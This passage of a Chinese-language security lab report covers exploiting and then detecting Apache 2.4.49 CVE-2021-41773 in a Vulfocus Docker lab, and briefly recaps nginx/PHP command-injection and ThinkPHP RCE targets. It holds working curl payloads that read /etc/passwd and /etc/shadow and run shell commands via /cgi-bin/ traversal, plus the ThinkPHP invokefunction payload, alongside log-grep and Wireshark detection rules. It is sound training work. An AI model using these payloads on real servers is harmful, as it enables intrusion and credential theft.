![1748153021142](image/第一层两靶标攻击与利用检测/1748153021142.png)

**扫描结果分析**：

- 常规HTTP端口(80, 443, 8080-8090)均显示为关闭或过滤状态
- Apache服务运行在非标准端口上，通过Vulfocus平台动态分配为**13503端口**
- 需要直接访问指定的映射端口进行后续信息收集

##### 2.2 Web 服务识别

通过浏览器访问 Apache 服务 `http://10.37.133.3:42286`。

![1748152989670](image/第一层两靶标攻击与利用检测/1748152989670.png)

##### 2.3 Apache 版本检测

```bash
# 使用 curl 获取服务器信息
curl -I http://10.37.133.3:42286

# 使用 nikto 进行 Web 扫描
nikto -h http://10.37.133.3:42286
```

![1748153862204](image/第一层两靶标攻击与利用检测/1748153862204.png)

**关键发现**：

- **服务器版本**: `Apache/2.4.49 (Debian)` - **这正是CVE-2021-41773漏洞影响的确切版本**
- **操作系统**: Debian Linux
- **文件修改时间**: 2021-10-09，与CVE披露时间吻合
- **响应正常**: HTTP 200状态码，服务器正常运行

##### 2.4 Nikto 安全扫描

**nikto扫描结果**:

![1748153891702](image/第一层两靶标攻击与利用检测/1748153891702.png)

**Nikto扫描分析**：

- **版本确认**: 再次确认Apache/2.4.49版本，**明确标注为过时版本**
- **安全配置缺陷**:
  - 缺少 `X-Frame-Options`头(点击劫持防护)
  - 缺少 `X-Content-Type-Options`头(MIME类型嗅探防护)
- **信息泄露**: ETag头可能泄露服务器inode信息
- **HTTP方法**: 支持POST, OPTIONS, HEAD, GET方法
- **重要**: 扫描过程中未触发明显的安全拦截，说明服务器配置相对宽松

##### 2.5 目录结构探测

```bash
# 使用 dirb 进行目录扫描
dirb http://10.37.133.3:42286
```

**dirb扫描结果**:

![1748153913104](image/第一层两靶标攻击与利用检测/1748153913104.png)

**目录发现分析**：

- **`/cgi-bin/` (403 Forbidden)**: **关键发现** - 这是CVE-2021-41773漏洞利用的核心路径
  - 403状态表明目录存在但访问被限制
  - CGI目录的存在为路径遍历攻击提供了入口点
- **`/index.html` (200 OK)**: 标准首页文件，大小10701字节
- **`/server-status` (403 Forbidden)**: Apache状态页面，被保护但存在

##### 2.6 信息收集总结

1. **漏洞确认**:

   - Apache版本2.4.49**完全匹配CVE-2021-41773的受影响版本**
   - 服务器配置标准，未发现特殊的安全加固
2. **攻击条件满足**:

   - **版本匹配**: 确认为易受攻击的Apache版本
   - **服务配置**: 标准Apache配置，为路径遍历攻击提供了条件
3. **安全态势评估**:

   - **高风险**: 版本完全匹配已知高危漏洞
   - **配置薄弱**: 缺少多个安全头，信息泄露风险
   - **攻击面**: CGI功能启用，为代码执行提供了可能

#### 3. 漏洞分析与利用

##### 3.1 CVE-2021-41773 漏洞原理

**漏洞基本信息**:

- **CVE编号**: CVE-2021-41773
- **CVSS评分**: 7.5 (高危)
- **漏洞类型**: 路径遍历 (Path Traversal)
- **影响版本**: Apache HTTP Server 2.4.49
- **漏洞原理**: Apache 2.4.49版本在处理URL路径规范化时存在缺陷，攻击者可以通过构造特殊的URL编码绕过路径限制，访问Web根目录之外的文件

**技术细节**:

- **根本原因**: Apache对URL中的路径分隔符和点号序列的处理不当
- **绕过机制**: 使用URL编码的点号(`%2e`)可以绕过路径规范化检查
- **攻击路径**: 通过Alias映射的目录(如 `/cgi-bin/`, `/icons/`)进行路径遍历

##### 3.2 路径遍历攻击实践

###### 3.2.1 基础路径遍历测试

```bash
# 尝试通过CGI路径读取 /etc/passwd 文件
curl "http://10.37.133.3:42286/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# 尝试读取 Apache 配置文件
curl "http://10.37.133.3:42286/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/apache2/apache2.conf"

# 尝试读取其他敏感文件
curl "http://10.37.133.3:42286/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow"
curl "http://10.37.133.3:42286/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/proc/version"
```

**执行结果分析**:
所有通过 `/cgi-bin/`路径的攻击尝试都返回了 `500 Internal Server Error`，这表明：

1. **CGI配置问题**: CGI模块可能没有正确配置或缺少必要的CGI脚本
2. **路径解析问题**: Apache可能对CGI路径下的路径遍历有特殊处理
3. **权限限制**: 可能存在额外的访问控制机制

###### 3.2.2 非CGI路径的直接遍历攻击

CVE-2021-41773不仅限于CGI路径，我们尝试其他映射路径：

```bash
# 尝试通过icons路径进行遍历
curl "http://10.37.133.3:42286/icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# 尝试通过manual路径进行遍历  
curl "http://10.37.133.3:42286/manual/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# 直接根路径尝试
curl "http://10.37.133.3:42286/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```

**执行结果**:

![1748164510299](image/第一层两靶标攻击与利用检测/1748164510299.png)

![1748164589138](image/第一层两靶标攻击与利用检测/1748164589138.png)

**攻击结果分析**:

1. ✅ **`/icons/` 路径攻击成功**

   - **状态**: 🎉 完全成功 - 读取到完整的 `/etc/passwd` 文件
   - **编码方式**: 仅使用基础的单层URL编码 `%2e%2e`（不需要双重编码）
   - **技术意义**: 证明CVE-2021-41773不仅限于CGI路径，还影响Apache的静态资源映射
2. 🚫 **`/manual/` 路径被阻止**

   - **状态**: 403 Forbidden
   - **原因**: Manual文档路径可能有特殊的访问控制配置
   - **安全策略**: 表明某些路径映射有额外的安全限制
3. 🚫 **直接根路径被阻止**

   - **状态**: 403 Forbidden
   - **原因**: 根路径的路径遍历被Apache的基础安全机制阻止

##### 3.3 远程代码执行(RCE)攻击

###### 3.3.1 CGI路径的RCE攻击尝试

```bash
# 通过CGI路径执行shell命令
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; id"
```

**RCE攻击结果**:

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
![1748164624555](image/第一层两靶标攻击与利用检测/1748164624555.png)
**🎉 RCE攻击成功！**

- **权限获取**: 成功以 `www-data`用户身份执行命令
- **攻击方式**: 通过CGI路径结合路径遍历，直接调用系统shell
- **编码技术**: 使用混合编码 `.%2e`绕过路径限制

###### 3.3.2 系统信息收集

```bash
# 获取系统信息
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; uname -a"

# 查看当前目录
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; pwd"

# 列出根目录内容
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; ls -la /"
```
![1748164663202](image/第一层两靶标攻击与利用检测/1748164663202.png)

##### 3.4 Flag文件搜索与获取

###### 3.4.1 系统文件搜索

```bash
# 搜索系统中所有包含flag的文件
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; find / -name '*flag*' 2>/dev/null"
```

![1748164677317](image/第一层两靶标攻击与利用检测/1748164677317.png)


找到了！flag文件在 `/tmp/flag-{bmha8de6a45-2ae2-4615-97ff-1af1edd5afcf}`**


#### 4. 威胁检测

##### 4.1 Apache 访问日志分析

###### 4.1.1 定位容器和日志路径

```bash
# 查看运行中的 Apache 容器
docker ps | grep apache
```

```bash
┌──(kali㉿kali-attacker)-[~]
└─$ docker ps | grep apache

a2b4c3a1d377   vulfocus/apache-cve_2021_41773:latest      "/entry.sh"              22 minutes ago   Up 20 seconds           0.0.0.0:42286->80/tcp, :::42286->80/tcp                                                flamboyant_maxwell
```

```bash

# 进入容器查看日志
docker exec -it a2b4c3a1d377 /bin/bash

# Apache 访问日志通常位于以下路径
ls -la /var/log/apache2/
# 重点关注 access.log 和 error.log
```

![1748160129290](image/apache靶标/1748160129290.png)

###### 4.1.2 访问日志分析

```bash
# 查看最近的访问日志
tail -f /var/log/apache2/access.log

# 搜索路径遍历攻击特征
grep -i "%2e%2e\|\.\./" /var/log/apache2/access.log

# 搜索CGI相关的可疑请求
grep -i "cgi-bin" /var/log/apache2/access.log

# 搜索icons路径的异常访问
grep -i "icons.*%2e" /var/log/apache2/access.log
```

![1748161429843](image/apache靶标/1748161429843.png)

![1748161438797](image/apache靶标/1748161438797.png)1. 路径遍历攻击记录

**通过 `/icons/`路径的攻击**：

```bash
10.37.133.2 - - [25/May/2025:07:39:25 +0000] "GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1" 200 1126 "-" "curl/8.7.1"
```

* **攻击特征**: 使用 `%2e%2e`（URL编码的 `..`）进行路径遍历
* **目标文件**: `/etc/passwd`系统用户文件
* **状态码**: `200` - **攻击成功**，返回了1126字节的文件内容
* **攻击工具**: `curl/8.7.1`

2. Flag文件搜索尝试

攻击者系统性地搜索flag文件的常见位置：

```bash
10.37.133.2 - - [25/May/2025:07:39:30 +0000] "GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/flag HTTP/1.1" 404 437 "-" "curl/8.7.1"
10.37.133.2 - - [25/May/2025:07:39:34 +0000] "GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/tmp/flag HTTP/1.1" 404 437 "-" "curl/8.7.1"
10.37.133.2 - - [25/May/2025:07:39:39 +0000] "GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/var/www/flag HTTP/1.1" 404 437 "-" "curl/8.7.1"
10.37.133.2 - - [25/May/2025:07:39:48 +0000] "GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/flag HTTP/1.1" 404 437 "-" "curl/8.7.1"
10.37.133.2 - - [25/May/2025:07:39:56 +0000] "GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/var/www/html/flag HTTP/1.1" 404 437 "-" "curl/8.7.1"
10.37.133.2 - - [25/May/2025:07:40:00 +0000] "GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/flag.txt HTTP/1.1" 404 437 "-" "curl/8.7.1"
```

**攻击模式分析**：

- **系统性搜索**: 攻击者按顺序尝试了多个可能的flag位置
- **状态码**: 全部返回 `404 Not Found`，说明这些位置没有flag文件
- **时间间隔**: 每次尝试间隔4-8秒，显示为手动或脚本化攻击

3. 远程代码执行(RCE)攻击

**通过CGI路径执行命令**：

```bash
10.37.133.2 - - [25/May/2025:07:40:16 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 188 "-" "curl/8.7.1"
10.37.133.2 - - [25/May/2025:07:40:21 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 887 "-" "curl/8.7.1"
10.37.133.2 - - [25/May/2025:07:40:26 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 133 "-" "curl/8.7.1"
```

**RCE攻击特征**：

- **攻击路径**: `/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh`
- **编码技术**: 混合使用 `.%2e`绕过路径限制
- **HTTP方法**: `POST` - 用于发送命令执行的payload
- **状态码**: `200` - **RCE攻击成功**
- **响应大小变化**: 从133字节到887字节，说明执行了不同的命令

4.1.3 错误日志分析

```bash
# 查看Apache错误日志
tail -f /var/log/apache2/error.log

# 搜索与路径遍历相关的错误
grep -i "path\|directory\|forbidden" /var/log/apache2/error.log

# 搜索CGI执行相关的错误
grep -i "cgi\|script" /var/log/apache2/error.log
```

![1748161515881](image/apache靶标/1748161515881.png)

Apache错误日志分析:

1. 路径遍历检测与阻止

**无效URI路径错误**：

```bash
[Sun May 25 07:39:43.793225 2025] [core:error] [pid 20:tid 281472604833344] [client 10.37.133.2:58584] AH10244: invalid URI path (/icons/../../../../index.html)
[Sun May 25 07:39:43.795361 2025] [core:error] [pid 20:tid 281472604833344] [client 10.37.133.2:58584] AH10244: invalid URI path (/icons/../../../../index.cgi)
[Sun May 25 07:39:43.795451 2025] [core:error] [pid 20:tid 281472604833344] [client 10.37.133.2:58584] AH10244: invalid URI path (/icons/../../../../index.pl)
[Sun May 25 07:39:43.795499 2025] [core:error] [pid 20:tid 281472604833344] [client 10.37.133.2:58584] AH10244: invalid URI path (/icons/../../../../index.php)
[Sun May 25 07:39:43.795517 2025] [core:error] [pid 20:tid 281472604833344] [client 10.37.133.2:58584] AH10244: invalid URI path (/icons/../../../../index.xhtml)
[Sun May 25 07:39:43.795536 2025] [core:error] [pid 20:tid 281472604833344] [client 10.37.133.2:58584] AH10244: invalid URI path (/icons/../../../../index.htm)
```

**关键发现**：

- **错误代码**: `AH10244` - Apache检测到无效的URI路径
- **攻击模式**: 使用未编码的 `../../../../`进行路径遍历
- **时间集中**: 在07:39:43的几毫秒内连续触发6次错误
- **目标文件**: 攻击者尝试访问各种index文件（.html, .cgi, .pl, .php, .xhtml, .htm）
- **防护机制**: Apache的路径规范化检查成功阻止了这些攻击

2. CGI执行错误分析

**CGI攻击分析**：

- **错误类型**: `cgid:error` - CGI守护进程错误
- **权限问题**: 系统拒绝执行 `/etc/passwd`文件（因为它不是可执行文件）
- **攻击意图**: 攻击者试图通过CGI路径直接执行系统文件
- **防护效果**: 文件系统权限成功阻止了恶意执行

**Shell执行错误**：

```bash
[Sun May 25 07:41:05.002629 2025] [cgid:error] [pid 20:tid 281472728565312] [client 10.37.133.3:58948] End of script output before headers: sh
```

**重要发现**：

- **攻击源变化**: 从 `10.37.133.2`切换到 `10.37.133.3`
- **执行目标**: 直接调用 `sh` shell
- **错误性质**: "End of script output before headers" - 表明shell被执行但没有产生有效的CGI输出头
- **攻击成功**: 尽管有错误，但这实际上表明RCE攻击可能已经成功

5. 安全防护效果评估

**成功的防护**：

- ✅ **路径规范化检查**: 阻止了未编码的路径遍历
- ✅ **文件权限控制**: 阻止了非可执行文件的执行
- ✅ **CGI安全机制**: 限制了恶意CGI执行

**防护绕过**：

- ❌ **编码绕过**: URL编码的路径遍历未被阻止（从访问日志可见）
- ❌ **Shell执行**: 最终成功执行了shell命令

##### 4.2 网络流量捕获与分析

###### 4.2.1 确定容器网络信息

```bash
# 获取 Apache 容器的详细信息
docker inspect a2b4c3a1d377 | grep -A 10 -B 5 "IPAddress"
```

![1748160719557](image/apache靶标/1748160719557.png)
根据容器信息，内部 IP 为 `172.17.0.2`

###### 4.2.2 HTTP流量监控

```bash
# 监听 Docker 网桥上的 HTTP 流量
sudo tcpdump -i docker0 -A -w apache_cve_traffic.pcap 'host 172.17.0.2'
```

在另一个终端执行攻击命令，然后停止抓包：

```bash
# 执行路径遍历攻击
curl "http://10.37.133.3:42286/icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# 执行RCE攻击
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; id"
```

![1748160898808](image/apache靶标/1748160898808.png)

![1748160908687](image/apache靶标/1748160908687.png)

###### 4.2.3 流量分析要点

使用 Wireshark 分析捕获的流量：

1. **路径遍历识别**: 查找包含 `%2e%2e`编码的HTTP GET请求
2. **RCE攻击识别**: 寻找向CGI路径发送POST数据的请求
3. **响应分析**: 观察服务器返回的敏感文件内容或命令执行结果
4. **异常模式**: 识别短时间内大量路径遍历尝试的模式

![1748160976060](image/apache靶标/1748160976060.png)

wireshark流量分析

1. 攻击流量概览

**捕获的数据包总数**: 20个数据包
**攻击持续时间**: 约4.2秒
**攻击源**: `10.37.133.3` (Kali攻击机)
**目标**: `172.17.0.2:80` (Apache容器)

2. 第一次攻击连接分析 (数据包1-10)

2.1 TCP连接建立

```
数据包1-3: TCP三次握手
- 数据包1 (0.000000s): SYN - 攻击机发起连接请求
- 数据包2 (0.000030s): SYN+ACK - 服务器响应连接
- 数据包3 (0.000040s): ACK - 连接建立完成
```

**连接特征**:

- **端口映射**: 攻击机端口40722 → 服务器端口80
- **建立时间**: 仅用时40微秒，连接建立非常快速
- **网络延迟**: 极低延迟，说明是本地Docker网络

2.2 RCE攻击载荷

```
数据包4 (0.000105s): HTTP POST请求
- 方法: POST
- 路径: /cgi-bin/..%2e/..%2e/..%2e/..%2e/bin/sh
- 长度: 290字节
- 协议: HTTP
```

**攻击特征分析**:

- **攻击类型**: 远程代码执行(RCE)
- **编码技术**: 使用 `..%2e`混合编码绕过路径检查
- **目标路径**: 通过CGI路径遍历到 `/bin/sh`
- **HTTP方法**: POST - 用于发送命令执行payload
- **载荷大小**: 290字节，包含完整的CGI命令执行数据

2.3 服务器响应

```
数据包5 (0.000125s): TCP ACK - 服务器确认收到请求
数据包6 (0.040140s): HTTP 200 OK响应
- 状态码: 200 OK
- 内容类型: text/plain
- 响应长度: 254字节
- 处理时间: 40毫秒
```

**响应分析**:

- **攻击成功**: HTTP 200状态码表明RCE攻击成功执行
- **响应内容**: text/plain格式，包含命令执行结果
- **处理延迟**: 40毫秒的处理时间，说明服务器执行了shell命令
- **数据大小**: 254字节响应，可能包含 `id`命令的输出结果

2.4 连接关闭

```
数据包7-10: TCP连接关闭
- 数据包8: 攻击机发起FIN+ACK
- 数据包9: 服务器响应FIN+ACK  
- 数据包10: 攻击机确认ACK
```

3. 第二次攻击连接分析 (数据包11-20)

3.1 新连接建立

```
数据包11-13 (4.212s): 第二次TCP三次握手
- 时间间隔: 4.2秒后发起新连接
- 新端口: 40254 → 80
- 建立时间: 18微秒
```

3.2 路径遍历攻击

```
数据包14 (4.212111s): HTTP GET请求
- 方法: GET  
- 路径: /icons/..%2e%2e/..%2e%2e/..%2e%2e/..%2e%2e/etc/passwd
- 长度: 191字节
- 协议: HTTP
```

**攻击特征分析**:

- **攻击类型**: 路径遍历文件读取
- **目标文件**: `/etc/passwd`系统用户文件
- **攻击路径**: 通过 `/icons/`路径进行遍历
- **编码方式**: `..%2e%2e`双重编码绕过检查
- **HTTP方法**: GET - 用于文件读取

3.3 文件读取成功

```
数据包16 (4.212740s): HTTP 200 OK响应
- 状态码: 200 OK
- 响应长度: 1192字节
- 处理时间: 0.6毫秒
```

**响应分析**:

- **攻击成功**: HTTP 200状态码确认文件读取成功
- **文件大小**: 1192字节，与 `/etc/passwd`文件大小一致
- **快速响应**: 0.6毫秒处理时间，说明是直接文件读取
- **数据泄露**: 成功获取了系统用户信息

4. 攻击模式总结

4.1 攻击时序分析

```
时间轴:
0.000s - 0.041s: RCE攻击 (连接1)
4.212s - 4.216s: 文件读取攻击 (连接2)
```

**攻击策略**:

- **分阶段攻击**: 先执行命令获取权限，再读取敏感文件
- **连接复用**: 使用不同TCP连接避免检测
- **时间间隔**: 4秒间隔，可能是手动操作或脚本延迟

4.2 技术特征识别

```
编码技术对比:
- RCE攻击: ..%2e (混合编码)
- 文件读取: ..%2e%2e (双重编码)
```

**绕过技术**:

- **路径多样化**: CGI路径和icons路径分别利用
- **编码变化**: 不同的URL编码方式
- **方法切换**: POST执行命令，GET读取文件

5. 安全检测要点

5.1 流量特征检测

```bash
# 检测路径遍历特征
- URL包含: %2e%2e, ..%2e, ../../../../
- 路径模式: /cgi-bin/.., /icons/..
- 目标文件: /etc/passwd, /bin/sh
```

5.2 异常行为识别

```bash
# 异常响应模式
- CGI路径返回200状态码
- 大量字节的文件读取响应
- 短时间内多次路径遍历尝试
```

5.3 网络监控规则

```bash
# Wireshark过滤规则
http.request.uri contains "%2e%2e" or 
http.request.uri contains "cgi-bin" and http.request.uri contains ".." or
http.request.uri contains "icons" and http.request.uri contains ".."
```

6. 攻击成功指标

**确认攻击成功的关键证据**:

1. ✅ **RCE成功**: POST请求返回200状态码，254字节响应
2. ✅ **文件读取成功**: GET请求返回200状态码，1192字节响应
3. ✅ **权限获取**: 能够执行系统命令和读取敏感文件
4. ✅ **绕过防护**: 成功绕过Apache的路径检查机制

## 四、实验总结

本次实验成功完成了对第一层网络中两个典型靶标 `c4pr1c3/vulshare_nginx-php-flag:latest` 和 `vulfocus/thinkphp-cve_2018_1002015:latest` 的攻击、利用及检测。通过实践，我们达成了以下主要学习和操作目标：

1. **环境搭建与靶场熟悉**：

   * 成功在 macOS 物理主机上通过 Parallels Desktop 部署了 Kali Linux 虚拟机作为攻击机。
   * 在 Kali 环境中，熟练配置和使用了 Docker 及 Vulfocus 平台，能够顺利拉取、启动和管理目标靶机 Docker 镜像，为后续的渗透测试和安全分析奠定了基础。
2. **漏洞分析与利用实践**：

   * **针对 `c4pr1c3/vulshare_nginx-php-flag:latest`** (Nginx + PHP 命令注入漏洞):
     * 通过信息收集（`nmap` 扫描、浏览器访问页面提示 `index.php?cmd=ls /tmp`），快速识别了基于 GET 参数的命令注入漏洞。
     * 利用 `curl` 工具构造恶意 URL (如 `index.php?cmd=ls%20/tmp`)，成功执行了任意系统命令（如 `ls`, `id`, `uname -a`, `ls -la /`），并直接在 `/tmp` 目录下找到了 flag。
     * 验证了漏洞的广泛利用性，能够获取系统信息、用户信息和目录结构。
   * **针对 `vulfocus/thinkphp-cve_2018_1002015:latest`** (ThinkPHP 5.x RCE 漏洞，类似 CVE-2018-20062):
     * 通过分析靶标名称和 CVE 编号的暗示，推断其与 ThinkPHP 5.x 的远程代码执行漏洞相关。
     * 学习并掌握了利用 ThinkPHP 框架对控制器名称解析缺陷的 RCE Payload 构造方法，特别是 `s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=<function_name>&vars[1][]=<argument>` 的形式。
     * 成功执行了 `phpinfo()` (验证漏洞存在性) 和 `id` (获取当前用户权限，确认为 root)，并最终通过 `find / -name '*flag*'` 命令定位到 flag 文件 `/tmp/flag-{bmh8b59ed0c-3042-499e-9a2d-ef93c0e1ec87}`，再通过 `cat` 命令读取了 flag 内容。
     * 掌握了对 URL中特殊字符（如 `[`、`]`、`{`、`}`）进行百分号编码以确保 `curl` 命令正确执行的重要性。
3. **威胁检测与日志分析能力提升**：

   * **靶标一 (Nginx + PHP)**:
     * 通过 `docker exec` 进入容器内部，成功定位并分析了 Nginx 的访问日志 (`/var/log/nginx/access.log`)，从中筛选出包含恶意 `cmd` 参数的攻击请求记录。
     * 解决了在 Kali 主机（同时作为 Docker 宿主机）上使用 `tcpdump` 捕获针对本机 Docker 容器流量时遇到的 `0 packets captured` 问题。通过逐步排查，最终确定需要监听 Docker 的网桥接口 (`docker0`) 并使用容器的内部 IP (`172.17.0.2`) 和实际服务端口 (`80`) 作为过滤条件，成功捕获并使用 Wireshark 分析了攻击流量，清晰观察到了 TCP 握手、恶意 HTTP GET 请求及服务器响应。
   * **靶标二 (ThinkPHP)**:
     * 在容器内，通过尝试常见的 Web 服务器日志路径失败后，根据 ThinkPHP 的特性，在 `/app/runtime/log/` 目录下找到了按日期组织的框架应用日志 (如 `/app/runtime/log/202505/24.log`)。分析了这些日志，识别了包含 RCE Payload 的请求记录，并注意到了伴随的 `variable type error: boolean` 错误（虽然不影响漏洞利用）。
     * 同样应用了正确的 `tcpdump` 配置（监听 `docker0`，目标为容器内部 IP `172.17.0.2` 和端口 `80`），捕获并使用 Wireshark 分析了针对 ThinkPHP 靶标的攻击流量，再次验证了攻击步骤和数据回传。
4. **问题解决与经验积累**：

   * 实验中最显著的挑战是 `tcpdump` 的配置。通过系统性的排查（从 `any` 接口到物理接口 `eth1`，再到回环接口 `lo`，最终到 Docker 网桥 `docker0`），加深了对 Docker 网络模式和本地流量捕获复杂性的理解。
   * 遇到了 `curl` 因 URL 中包含未编码的特殊字符（如 `[]`）而报错的问题，通过学习和应用 URL 百分号编码成功解决。
   * 在进入 Docker 容器时，当 `/bin/bash` 不存在时，学会了尝试使用 `/bin/sh`。

**总结与反思**：
本次实验不仅系统性地实践了从环境准备、信息收集、漏洞利用到威胁检测的全过程，而且在解决实际操作中遇到的问题（如 `tcpdump` 配置、`curl` 特殊字符处理、容器内 shell 环境差异）方面获得了宝贵的经验。通过对不同类型 Web 应用（简单 PHP 应用和基于框架的 ThinkPHP 应用）的攻击，对各自的漏洞特点和日志记录方式有了更深入的认识。这些技能和经验对于未来进行更复杂的渗透测试、安全审计以及构建更有效的防御策略都具有重要意义。

# 五、遇到的问题和解决方案

配置和使用 `tcpdump` 进行网络流量捕获时，`tcpdump` 无法捕获到预期的数据包 (显示 `0 packets captured`)。以下是排查和解决问题的步骤：

1. **初步尝试与问题**:

   * 最初尝试使用 `sudo tcpdump -i any -A 'host 10.37.133.3 and port 8630' -w nginx_php_flag_traffic.pcap` 命令。参数 `-i any` 意图监听所有接口。
   * **结果**: `0 packets captured`。同时出现警告 `any: That device doesn't support promiscuous mode`。
     ![1748019457185](image/第一层两靶标攻击与利用检测/1748019457185.png)
2. **指定物理/虚拟网络接口 (`eth1`)**:

   * 通过 `ip addr` 命令查看网络接口，发现 Kali 虚拟机的 IP `10.37.133.3` 配置在 `eth1` 接口上。
   * 修改命令为 `sudo tcpdump -i eth1 -A 'host 10.37.133.3 and port 8630' -w nginx_php_flag_traffic.pcap`。
   * **结果**: 仍然是 `0 packets captured`。
   * **分析**: 由于靶机服务 (`10.37.133.3:8630`) 和攻击命令 (`curl`) 均在同一台 Kali 主机上执行，流量可能主要在本地回环或 Docker 内部网络中，并未经过 `eth1` 接口进行外部路由。
     ![1748019473424](image/第一层两靶标攻击与利用检测/1748019473424.png)
3. **尝试回环接口 (`lo`)**:

   * 考虑到流量可能在本地主机内部，尝试监听回环接口：`sudo tcpdump -i lo -A 'port 8630' -w nginx_php_flag_traffic.pcap`。
   * **结果**: 依然是 `0 packets captured`。
   * **分析**: 这表明流量甚至没有完全通过标准的回环接口，或者过滤条件不准确。更深层的原因在于 Docker 的网络机制。

   ![1748019483551](image/第一层两靶标攻击与利用检测/1748019483551.png)
4. **深入 Docker 网络层面进行排查与解决**:

   * **理解 Docker 网络**: 当 Docker 容器通过端口映射 (如 `-p 8630:80`) 暴露服务时，宿主机 (Kali) 上的请求 (`http://10.37.133.3:8630`) 会被 Docker 进程截获，并通过其内部的虚拟网桥 (通常是 `docker0`) 路由到容器的内部 IP 和实际端口 (如 `172.17.0.2:80`)。
   * **获取容器内部 IP**: 使用 `docker ps` 获取目标容器的 ID (`c93755678f6c`)。然后使用 `docker inspect c93755678f6c` 查看其详细网络配置。
     ```json
     // docker inspect c93755678f6c 输出的关键部分
     "NetworkSettings": {
         // ...
         "IPAddress": "172.17.0.2", // 容器在 bridge 网络上的 IP
         "Networks": {
             "bridge": {
                 // ...
                 "IPAddress": "172.17.0.2",
                 "Gateway": "172.17.0.1",
                 // ...
             }
         }
     }
     ```
   * **确定监听接口和过滤条件**:
     * 容器 IP 为 `172.17.0.2`。
     * 容器内部服务端口为 `80`。
     * 宿主机上对应的 Docker 网桥接口为 `docker0` (其 IP 通常是容器网络的网关，如 `172.17.0.1`)。
   * **最终正确的 `tcpdump` 命令**:
     ```bash
     sudo tcpdump -i docker0 -A 'host 172.17.0.2 and port 80' -w nginx_php_flag_traffic.pcap
     ```
   * **结果**: 成功捕获到10个数据包。
   * **结论**: 对于此类宿主机与本机 Docker 容器间的通信，需要监听 Docker 的虚拟网桥接口 (`docker0`)，并使用容器的内部 IP 和实际服务端口作为过滤条件。
